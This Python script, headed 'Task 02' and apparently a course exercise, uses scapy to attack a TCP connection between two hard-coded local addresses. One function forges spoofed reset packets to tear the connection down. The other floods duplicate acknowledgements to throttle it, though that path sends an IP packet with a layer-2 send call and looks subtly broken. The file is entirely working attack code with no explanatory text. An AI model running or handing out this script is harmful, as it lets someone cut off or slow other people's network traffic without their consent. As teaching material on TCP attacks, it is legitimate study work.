# Task 02

# imports
import scapy.all as sc

WINDOW_SIZE = 501


def Throttling_TCP(src_ip, dst_ip, interrupt=True):
    def src_dest_filter(pkt):
        if sc.IP in pkt and sc.TCP in pkt:
            if pkt[sc.IP].src == src_ip and pkt[sc.IP].dst == dst_ip:
                if pkt[sc.TCP].flags == 'A':
                    return True
        return False
    
    
    def interrupt_connection():
        def send_reset(p):
            src_ip = p[sc.IP].src
            src_port = p[sc.TCP].sport
            dst_ip = p[sc.IP].dst
            dst_port = p[sc.TCP].dport
            ack = p[sc.TCP].ack

            frame = sc.IP(src=dst_ip, dst=src_ip) / sc.TCP(sport=dst_port, dport=src_port, flags="R", seq=ack, window=WINDOW_SIZE)

            sc.send(frame)

        input("interrupt now: (ENTER)")
        sc.sniff(
                    count = 1,
                    lfilter=src_dest_filter, 
                    prn=send_reset
                )


    def throttle_connection():
        def slow_tcp(p):
            src_ip = p[sc.IP].src
            dst_ip = p[sc.IP].dst
            ack = p[sc.TCP].ack
            seq = p[sc.TCP].seq

            ack_packet = sc.IP(src=src_ip, dst=dst_ip) / sc.TCP(ack=ack, seq=seq, flags="A")

            sc.sendp(ack_packet, count=3)

        
        input("throttle now: (ENTER)")
        sc.sniff(
                    lfilter=src_dest_filter, 
                    prn=slow_tcp
                )


    if interrupt:
        interrupt_connection()
    else:
        throttle_connection()


if __name__ == '__main__':
    Throttling_TCP(src_ip='192.168.1.46', dst_ip='192.168.1.68', interrupt=False)
